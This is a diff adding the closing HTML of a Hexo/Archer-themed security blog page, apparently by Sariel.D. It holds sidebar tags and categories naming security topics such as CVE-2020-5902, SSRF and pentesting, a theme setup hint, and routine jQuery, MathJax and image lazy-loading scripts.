+        <span class="sidebar-tag-name" data-tags="Chrome"><span class="iconfont-archer">&#xe606;</span>Chrome</span>
+    
+        <span class="sidebar-tag-name" data-tags="cobaltstirke"><span class="iconfont-archer">&#xe606;</span>cobaltstirke</span>
+    
+        <span class="sidebar-tag-name" data-tags="Discuz"><span class="iconfont-archer">&#xe606;</span>Discuz</span>
+    
+        <span class="sidebar-tag-name" data-tags="F5"><span class="iconfont-archer">&#xe606;</span>F5</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2020-5902"><span class="iconfont-archer">&#xe606;</span>CVE-2020-5902</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="fastjson"><span class="iconfont-archer">&#xe606;</span>fastjson</span>
+    
+        <span class="sidebar-tag-name" data-tags="Frida"><span class="iconfont-archer">&#xe606;</span>Frida</span>
+    
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
+    
+        <span class="sidebar-tag-name" data-tags="jenkins"><span class="iconfont-archer">&#xe606;</span>jenkins</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="Redis"><span class="iconfont-archer">&#xe606;</span>Redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="struts"><span class="iconfont-archer">&#xe606;</span>struts</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="OpenCV"><span class="iconfont-archer">&#xe606;</span>OpenCV</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约"><span class="iconfont-archer">&#xe606;</span>智能合约</span>
+    
+        <span class="sidebar-tag-name" data-tags="spider"><span class="iconfont-archer">&#xe606;</span>spider</span>
+    
+        <span class="sidebar-tag-name" data-tags="smali"><span class="iconfont-archer">&#xe606;</span>smali</span>
+    
+        <span class="sidebar-tag-name" data-tags="hw2020"><span class="iconfont-archer">&#xe606;</span>hw2020</span>
+    
+        <span class="sidebar-tag-name" data-tags="深信服"><span class="iconfont-archer">&#xe606;</span>深信服</span>
+    
+        <span class="sidebar-tag-name" data-tags="0day"><span class="iconfont-archer">&#xe606;</span>0day</span>
+    
+        <span class="sidebar-tag-name" data-tags="CAPTCHA"><span class="iconfont-archer">&#xe606;</span>CAPTCHA</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="编程"><span class="iconfont-archer">&#xe60a;</span>编程</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="Pentest"><span class="iconfont-archer">&#xe60a;</span>Pentest</span>
+    
+        <span class="sidebar-category-name" data-categories="渗透"><span class="iconfont-archer">&#xe60a;</span>渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
+    
+        <span class="sidebar-category-name" data-categories="其他"><span class="iconfont-archer">&#xe60a;</span>其他</span>
+    
+        <span class="sidebar-category-name" data-categories="验证码"><span class="iconfont-archer">&#xe60a;</span>验证码</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Sariel.D"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var i=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){i&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
+
+
